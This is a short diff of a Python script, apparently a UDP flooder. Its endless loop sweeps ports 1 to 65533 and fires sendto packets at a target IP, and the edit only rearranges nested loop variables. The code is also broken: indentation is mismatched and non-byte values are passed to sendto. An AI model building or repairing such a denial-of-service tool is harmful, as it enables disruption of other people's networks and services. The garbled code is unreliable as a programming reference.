@@ -48,8 +48,7 @@ time.sleep(3)
 while True:
     sent = 0
     for port in range(1, 65534):
-    	for sent in range(1, 65534):
-    	for threads in range(1, 65534):
+    	for bytes in range(1, 65534):
         white.sendto(bytes, (ip, port))
         white.sendto(threads, (ip, port))
         white.sendto(sent, (ip, port))
